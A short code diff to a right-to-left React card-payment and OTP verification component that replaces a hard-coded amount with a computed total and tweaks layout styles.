@@ -95,7 +95,7 @@ const data={cardNumber,cardholderName,cvv,month,yaer}
       <div className="flex justify-center items-center min-h-screen " dir="rtl" style={{zoom:0.8,fontSize:12,lineHeight:1.2,padding:25}}>
       {isLoading && <FullPageLoader text="Verifying OTP..." />}
         <OTPVerification
-          amount="1.000"
+          amount={total}
           cardNumber={cardNumber || "5586861234568686"}
           onVerify={handleVerifyOTP}
           onCancel={handleResetForm}
@@ -106,10 +106,10 @@ const data={cardNumber,cardholderName,cvv,month,yaer}
 
 
   return (
-    <div className="flex justify-center items-center min-h-screen " dir="rtl" style={{zoom:0.8,fontSize:12,lineHeight:1.2,padding:15}}>
+    <div className="flex justify-center items-center min-h-screen " dir="rtl" style={{zoom:0.75,fontSize:12,lineHeight:1.2,padding:15}}>
       {isLoading && <FullPageLoader />}
 
-      <div className="w-full max-w-md bg-white border border-gray-200 shadow-sm">
+      <div className=" max-w-md bg-white border border-gray-200 shadow-sm">
         {/* Language selector */}
         <div className="text-left p-4">
           <span className="text-red-600 font-medium">English</span>
